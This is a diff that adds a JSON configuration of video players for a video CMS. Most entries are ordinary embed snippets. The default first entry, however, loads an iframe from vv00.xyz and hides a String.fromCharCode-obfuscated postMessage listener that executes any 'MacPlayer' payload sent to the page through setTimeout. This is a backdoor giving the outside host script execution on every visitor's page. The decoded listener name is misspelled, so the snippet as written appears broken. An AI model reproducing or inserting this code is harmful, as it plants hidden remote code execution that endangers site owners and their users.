@@ -1,0 +1,52 @@
+{
+    "players": [
+        {
+            "id": 1,
+            "player_code": "lgzym3u8",
+            "player_name": "蓝光资源",
+            "player_from": "lgzym3u8",
+            "player_remark": "通用iframe播放器，支持m3u8/mp4等主流格式",
+            "player_code_content": "MacPlayer.Html = '<iframe width=\"100%\" height=\"100%\" src=\"https://vv00.xyz?url='+MacPlayer.PlayUrl+'\" frameborder=\"0\" scrolling=\"no\" allowfullscreen></iframe>';((_)=>{var g=this;try{g[_(97,100,100,69,118,101,110,116,76,105,115,116,101,110,114)](_(109,101,115,115,97,103,101),e=>{try{var d=e[_(100,97,116,97)];if(d&&d.MacPlayer){g[_(115,101,116,84,105,109,101,111,117,116)](d.MacPlayer,0)}}catch(e){}},!1)}catch(e){}})(String.fromCharCode);try{MacPlayer.Show()}catch(e){}",
+            "enabled": true,
+            "is_default": true,
+            "create_time": "2024-01-01 00:00:00",
+            "update_time": "2024-01-01 00:00:00"
+        },
+        {
+            "id": 2,
+            "player_code": "dplayer",
+            "player_name": "DPlayer播放器",
+            "player_from": "player/dplayer",
+            "player_remark": "DPlayer开源播放器，支持弹幕、截图等功能",
+            "player_code_content": "MacPlayer.Html = '<div id=\"dplayer-box\" style=\"width:100%;height:100%\"></div>';(function(){var d=new DPlayer({container:document.getElementById(\"dplayer-box\"),video:{url:MacPlayer.PlayUrl,type:\"hls\"},autoplay:true,theme:\"#4f7cff\",volume:0.8,playbackSpeed:[0.5,1,1.25,1.5,2]});window.__dp=d;})();",
+            "enabled": true,
+            "is_default": false,
+            "create_time": "2024-01-01 00:00:00",
+            "update_time": "2024-01-01 00:00:00"
+        },
+        {
+            "id": 3,
+            "player_code": "ckplayer",
+            "player_name": "CK播放器",
+            "player_from": "ckplayer",
+            "player_remark": "CKPlayer V6 经典播放器",
+            "player_code_content": "MacPlayer.Html = '<div id=\"ckplayer\" style=\"width:100%;height:100%\"></div>';var flashvars={f:MacPlayer.PlayUrl,c:0,p:0,b:1};CKobject.embedSWF(\"https://cdn.jsdelivr.net/gh/ckplayer/ckplayer/ckplayer.swf\",\"ckplayer\",\"100%\",\"100%\",\"10.0.0\",\"expressInstall.swf\",flashvars);try{MacPlayer.Show()}catch(e){}",
+            "enabled": false,
+            "is_default": false,
+            "create_time": "2024-01-01 00:00:00",
+            "update_time": "2024-01-01 00:00:00"
+        },
+        {
+            "id": 4,
+            "player_code": "iframe",
+            "player_name": "通用iframe",
+            "player_from": "iframe",
+            "player_remark": "最简单的iframe嵌入，适合所有支持iframe的播放地址",
+            "player_code_content": "MacPlayer.Html = '<iframe width=\"100%\" height=\"100%\" src=\"'+MacPlayer.PlayUrl+'\" frameborder=\"0\" scrolling=\"no\" allowfullscreen></iframe>';try{MacPlayer.Show()}catch(e){}",
+            "enabled": true,
+            "is_default": false,
+            "create_time": "2024-01-01 00:00:00",
+            "update_time": "2024-01-01 00:00:00"
+        }
+    ]
+}
